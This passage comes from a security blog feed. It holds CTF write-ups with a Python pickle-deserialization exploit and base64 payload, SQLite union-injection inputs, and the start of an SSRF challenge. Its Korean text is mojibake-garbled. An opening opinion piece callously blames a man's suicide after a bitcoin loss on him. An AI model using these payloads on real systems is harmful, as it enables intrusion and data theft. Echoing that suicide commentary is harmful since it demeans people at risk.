decades, hundreds of years, humanity will develop further, and as humanity progresses, science and technology will also develop. After all, colonizing Mars to create an environment in which people can live is not impossible in the future. This is an investment. It is not looking at the present, but looking at the future.</p><p>There are many other things to talk about. Cell phones, computers, cars, subways, etc. Did people in the past think of this? Everyone doubts when the first smartphone came out, but now it has become one of the indispensable items for people around the world.</p><p>Like this, there can be no doubt and criticism in history for anything. If you want to change the present, someone has to invest in the future with criticism and suspicion.</p><hr><h2 id="Coin-thoughts"><a href="#Coin-thoughts" class="headerlink" title="Coin thoughts"></a>Coin thoughts</h2><p>Currently, the coin is speculative. Because coins donâ€™t make money. Coins are a structure in which money is made only when there is someone who makes them more expensive than the price I bought. Investing value in coins? There is no such thing. It is the difference between who follows the flow better or who canâ€™t. If youâ€™re going to invest in value, just invest in places like Apple, Samsung and Tesla. Will the forces that are investing now see the business and invest? Itâ€™s just a strategy between centipedes and suck on them. If the factions are investing in value, they just need to hit a coin and burn the zone, but the factions just pull it out and eat it. In the end, it is the ants that flock to the top.</p><p>There are many kinds of ants. It is impossible to release all of this in words. Those who just carry their brains as decorations, those who use their brains to think but doubt their thoughts, and those who miss the timing. However, these ants are supposed to be rescued by waiting. because? This is because the forces have to suck up again. However, people canâ€™t wait for their turn and just jump off without parachute. So, go to the Han River and hit the head and search. In the end, investment/speculation is also your fault, so why commit suicide? A man in his twenties committed suicide this year after a bitcoin decline. It seems to be around April 20th. In fact, Bits have been falling since April 14th. So I told my friend to wait for cash because it was open until the first adjustment was 63 million won and the second adjustment was 50 million. It really did. But now Iâ€™ve almost recovered. Canâ€™t think of anything? Eventually, if you wait, you will find the main battle, and if you have a good coin choice, you are in a situation where you even earn profit. But he committed suicide.</p><p>However, some people blame the government for his death. Of course, it is true that the government has no answer right now. Hope to find it quickly. However, all investments/speculations are your fault. Just have to wait and jump and bring it down, I guess you just wondered about death.</p><hr><blockquote><p>Originally, many people curse and doubt.</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> Future </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Future </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ã¥ngstrom CTF 2021 Write Up</title>
      <link href="2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/"/>
      <url>2021/04/04/2021-04-04-%C3%A5ngstromCTF-2021/</url>
      
        <content type="html"><![CDATA[<p>ì‹¬ì‹¬í•´ì„œ 4ì¼ì— 1ì‹œê°„ ì •ë„í–ˆëŠ”ë° ì—­ì‹œ í•´í‚¹ì€ ì·¨ë¯¸ê°€ ë”±ì¸ ê±° ê°™ë‹¤ :)</p><hr><h2 id="Web-Jar-70-pts"><a href="#Web-Jar-70-pts" class="headerlink" title="(Web) Jar [70 pts]"></a>(Web) Jar [70 pts]</h2><blockquote><p>Jar ë¬¸ì œëŠ” Python Pickle ëª¨ë“ˆì—ì„œ ë°œìƒí•˜ëŠ” ì—­ì§ë ¬í™” RCE ì·¨ì•½ì ì„ ì´ìš©í•´ í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;actf&#123;FAKE_FLAG&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pickle.jpg&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bg</span>():</span></span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">&#x27;pickle.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jar</span>():</span></span><br><span class="line">contents = request.cookies.get(<span class="string">&#x27;contents&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;form method=&quot;post&quot; action=&quot;/add&quot; style=&quot;text-align: center; width: 100%&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;item&quot; placeholder=&quot;Item&quot;&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style=&quot;width: 100%; height: 100%&quot; src=&quot;/pickle.jpg&quot;&gt;&#x27;</span> + \</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&lt;div style=&quot;background-color: white; font-size: 3em; position: absolute; top: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%; left: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%;&quot;&gt;<span class="subst">&#123;item&#125;</span>&lt;/div&gt;&#x27;</span> <span class="keyword">for</span> item <span class="keyword">in</span> items)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">contents = request.cookies.get(<span class="string">&#x27;contents&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line">items.append(request.form[<span class="string">&#x27;item&#x27;</span>])</span><br><span class="line">response = make_response(redirect(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">response.set_cookie(<span class="string">&#x27;contents&#x27;</span>, base64.b64encode(pickle.dumps(items)))</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">app.run(threaded=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³´ë©´ í”Œë˜ê·¸ëŠ” <code>flag</code> ë³€ìˆ˜ì— ë“¤ì–´ê°€ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  indexë¥¼ ë³´ë©´ <code>contentes</code>ë¼ëŠ” ì¿ í‚¤ì˜ ê°’ì„ ê°€ì ¸ì™€ì„œ <code>loads()</code> í•¨ìˆ˜ì˜ ì¸ì ë„˜ê²¨ì£¼ê¸° ë•Œë¬¸ì— ì—­ì§ë ¬í™” ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‹ˆ ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ ì´ìš©í–‡ RECë¥¼ íŠ¸ë¦¬ê±°í•´ì„œ í…œë¸”ë¦¿ ë³€ìˆ˜ë¡œ <code>flag</code> ë³€ìˆ˜ë¥¼ ë„˜ê²¨ì£¼ë©´ ë  ê±° ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exploit</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;&#123;flag&#125;&quot;</span>, ))</span><br><span class="line">print(base64.b64encode(pickle.dumps(exploit())))</span><br><span class="line"><span class="comment"># b&#x27;gANjYnVpbHRpbnMKZXZhbApxAFgGAAAAe2ZsYWd9cQGFcQJScQMu&#x27;</span></span><br></pre></td></tr></table></figure><p>ìœ„ì™€ ê°™ì´ ìµìŠ¤ ì½”ë“œë¥¼ ì‘ì„±í•´ì£¼ì—ˆìŠµë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Jar/1.png?raw=true"></p><p><code>contentes</code>ë¼ëŠ” ì¿ í‚¤ì˜ ê°’ìœ¼ë¡œ ìœ„ í˜ì´ë¡œë“œë¥¼ ë„˜ê²¨ì£¼ë‹ˆ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><blockquote><p>FLAG : actf{you_got_yourself_out_of_a_pickle}</p></blockquote><hr><h2 id="Web-Sea-of-Quills-70-pts"><a href="#Web-Sea-of-Quills-70-pts" class="headerlink" title="(Web) Sea of Quills [70 pts]"></a>(Web) Sea of Quills [70 pts]</h2><blockquote><p>Sea of Quills ë¬¸ì œëŠ” SQLite Injection ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sqlite3&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:bind</span>, <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">set <span class="symbol">:port</span>, <span class="number">4567</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">db = SQLite3::Database.new <span class="string">&quot;quills.db&quot;</span></span><br><span class="line"><span class="variable">@row</span> = db.execute( <span class="string">&quot;select * from quills&quot;</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">erb <span class="symbol">:index</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/quills&#x27;</span> <span class="keyword">do</span></span><br><span class="line">erb <span class="symbol">:quills</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/quills&#x27;</span> <span class="keyword">do</span></span><br><span class="line">db = SQLite3::Database.new <span class="string">&quot;quills.db&quot;</span></span><br><span class="line">cols = params[<span class="symbol">:cols</span>]</span><br><span class="line">lim = params[<span class="symbol">:limit</span>]</span><br><span class="line">off = params[<span class="symbol">:offset</span>]</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;-&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; <span class="params">|word|</span></span><br><span class="line"><span class="keyword">if</span> cols.<span class="keyword">include</span>? word</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;beep boop sqli detected!&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;bad, no quills for you!&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="variable">@row</span> = db.execute(<span class="string">&quot;select %s from quills limit %s offset %s&quot;</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">p @row</span><br><span class="line"></span><br><span class="line">erb <span class="symbol">:specific</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ë¬¸ì œì—ì„œ ì†ŒìŠ¤ ì½”ë“œë¥¼ ì œê³µí•´ì£¼ëŠ”ë° ë£¨ë¹„ì¸ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì½”ë“œë¥¼ ë³´ë©´ <code>cols</code>, <code>limit</code>, <code>offset</code>ì˜ ê°’ì„ ê°€ì ¸ì™€ì„œ í•„í„°ë§ ê²€ì¦ì„ í•˜ê³ , ì¿¼ë¦¬ë¬¸ ë‚´ì— ë„£ì€ í›„ì— <code>execute()</code> í•¨ìˆ˜ë¥´ ì´ìš©í•´ì„œ ì¿¼ë¦¬ë¥´ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì—¬ê¸°ì„œ <code>union</code> í‚¤ì›Œë“œë¥¼ í•„í„°ë§í•˜ì§€ ì•Šì•„ ì¿¼ë¦¬ë¥¼ 2ê°œ ì´ìƒ ì‹¤í–‰ì‹œì¼œì¤„ ìˆ˜ ìˆì„ ê±° ê°™ìŠµë‹ˆë‹¤. colsì— ê°’ì„ <code>select</code>ì™€ <code>from</code>ì— ì‚¬ì´ì— ë„£ì–´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆëŠ”ë° ë§Œì•½ <code>sql from sqlite union select &lt;column&gt;</code>ì„ ë„£ì–´ì¤€ë‹¤ë©´ SQL Injectionì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/3.png?raw=true"></p><p>ìš”ì²­ì„ ë³´ë‚´ë³´ë‹ˆ <code>cols</code>ì˜ ê°’ìœ¼ë¡œ <code>url</code>, <code>desc</code>, <code>name</code>ì´ ë„˜ì–´ê°€ëŠ” ê²ƒì„ ë³´ì•„ ì´ 3ê°œê°€ <code>quills</code> í…Œì´ë¸”ì˜ ì¡´ì¬í•˜ëŠ” ì»¬ëŸ¼ì¸ ê±° ê°™ìŠµë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/1.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit  : 1</span><br><span class="line">offset : 0</span><br><span class="line">cols   : sql from sqlite_msater union select url</span><br></pre></td></tr></table></figure><p>ìœ„ì™€ ê°™ì´ ë³´ë‚´ì£¼ë‹ˆ ë©”íƒ€ í…Œì´ë¸” <code>sqlite_master</code>ë¥¼ ì˜ ì°¸ì¡°í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆê³ , ì—¬ê¸°ì„œ <code>flagtable</code>ë¼ëŠ” í…Œì´ë¸”ì— <code>flag</code>ë¼ëŠ” ì»¬ëŸ¼ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/2.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit  : 1</span><br><span class="line">offset : 0</span><br><span class="line">cols   : flag from flagtable union select url</span><br></pre></td></tr></table></figure><p>ë§ˆì§€ë§‰ì„ ìœ„ì™€ ê°™ì´ <code>flagtable</code> í…Œì´ë¸”ì„ ì°¸ì¡°í•˜ë‹ˆ í”Œë˜ê·¸ê°€ ë‚˜ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><blockquote><p>FLAG : actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Line CTF 2021 Write Up</title>
      <link href="2021/03/21/2021-03-21-Line-CTF-2021/"/>
      <url>2021/03/21/2021-03-21-Line-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-diveinternal-50-pts"><a href="#Web-diveinternal-50-pts" class="headerlink" title=" (Web) diveinternal [50 pts]"></a><span style="color:#21C587"></span> (Web) diveinternal [50 pts]</h2><blockquote><p>diveinternal ë¬¸ì œëŠ” SSRF ì·¨ì•½ì ì„ ì´ìš©í•´ í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.env.NODE_ENV == <span class="string">&#x27;local&#x27;</span>) &#123; <span class="comment">//set the environment value before your running this app</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).config();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> target = process.env.TARGET_HOST;</span><br><span class="line"><span class="keyword">var</span> test = process.env.TEST;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  request(&#123;</span><br><span class="line">    headers: req.headers,</span><br><span class="line">    uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/`</span>,</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;apis&#x27;</span> , <span class="attr">data</span>: data.body&#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/coin&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  request(&#123;</span><br><span class="line">        headers: req.headers,</span><br><span class="line">        uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/coin`</span>,</span><br><span class="line">      &#125;).pipe(res);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  router.get(<span class="string">&#x27;/addsub&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    request(&#123;</span><br><span class="line">          </span><br><span class="line">          uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/addsub`</span>,</span><br><span class="line">          qs: &#123;</span><br><span class="line">            email: req.query.email,</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).pipe(res);</span><br><span class="line">    &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>ìœ„ ì½”ë“œëŠ” <code>api</code>ì¸ë° <code>$&#123;target&#125;</code>ì˜ ê°’ì„ ì´ìš©í•´ì„œ ìš”ì²­ ë³´ë‚´ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TEST&#x3D;test</span><br><span class="line">TARGET_HOST&#x3D;localhost:5050</span><br></pre></td></tr></table></figure><p>ë˜í•œ <code>TARGET_HOST</code>ì˜ ê°’ì€ ë¡œì»¬í˜¸ìŠ¤íŠ¸ì¸ ê²ƒì„ ë³´ì•„ ë‚´ë¶€ ì„œë²„ë¡œ ìš”ì²­ì„ ë³´ë‚´ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">FROM node:lts-alpine as base</span><br><span class="line"></span><br><span class="line">ADD .&#x2F;src &#x2F;src</span><br><span class="line">WORKDIR &#x2F;src</span><br><span class="line">COPY &#x2F;src&#x2F;package*.json &#x2F;</span><br><span class="line">EXPOSE 3000</span><br><span class="line"></span><br><span class="line">FROM base as production</span><br><span class="line">ENV NODE_ENV&#x3D;production</span><br><span class="line">ENV TARGET_HOST&#x3D;private:5000</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">RUN npm ci</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;node&quot;, &quot;bin&#x2F;www&quot;]</span><br><span class="line"></span><br><span class="line">FROM base as dev</span><br><span class="line">ENV NODE_ENV&#x3D;development</span><br><span class="line">ENV DEBUG&#x3D;frontend:*</span><br><span class="line">ENV TARGET_HOST&#x3D;private:5000</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;nodemon&quot;, &quot;bin&#x2F;www&quot;]</span><br><span class="line"></span><br><span class="line">FROM base as local</span><br><span class="line">ENV NODE_ENV&#x3D;development</span><br><span class="line">ENV DEBUG&#x3D;frontend:*</span><br><span class="line">ENV TARGET_HOST&#x3D;localhost:5050</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;nodemon&quot;, &quot;bin&#x2F;www&quot;]</span><br></pre></td></tr></table></figure><p>ë„ì»¤ íŒŒì¼ì„ í™•ì¸í•´ë³´ë©´ <code>5050</code> í¬íŠ¸ë§Œ ì—´ë ¤ ìˆëŠ” ê±´ ì•„ë‹ˆê³ , <code>5000</code>ë²ˆ í¬íŠ¸ë„ ì—´ë ¤ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¦‰, ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë‚´ë¶€ ì„œë²„ëŠ” localhost:5050, localhost:5000 ì´ 2ê°œê°€ ì¡´ì¬í•©ë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RunRollbackDB</span>(<span class="params">dbhash</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.environ[<span class="string">&#x27;ENV&#x27;</span>] == <span class="string">&#x27;LOCAL&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> dbhash <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dbhash is None&quot;</span></span><br><span class="line">        dbhash = <span class="string">&#x27;&#x27;</span>.join(e <span class="keyword">for</span> e <span class="keyword">in</span> dbhash <span class="keyword">if</span> e.isalnum())</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;backup/&#x27;</span>+dbhash):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Where is file?&quot;</span></span><br></pre></td></tr></table></figure><p>ê·¸ë¦¬ê³  ì¼ë‹¨ ì œì¼ ì¤‘ìš”í•œ í”Œë˜ê·¸ë¥¼ ì½ëŠ” ì¡°ê±´ì„ ë³´ë©´ í˜„ì¬ ì„œë²„ì˜ í™˜ê²½ë³€ìˆ˜ê°€ <code>LOCAL</code>ì´ ì•„ë‹ˆì—¬ì•¼í•˜ê³ , <code>&#39;backup/&#39; + dbahsh</code>ë¼ëŠ” íŒŒì¼ì´ ì¡´ì¬í•œë‹¤ë©´ <code>FLAG</code> íŒŒì¼ì„ ì½ê³ , ë°˜í™˜í•´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/coin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coin</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = app.response_class()</span><br><span class="line">        language = LanguageNomarize(request)</span><br><span class="line">        response.headers[<span class="string">&quot;Lang&quot;</span>] =  language</span><br><span class="line">        data = getCoinInfo()</span><br><span class="line">        response.data = json.dumps(data)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        err = <span class="string">&#x27;Error On 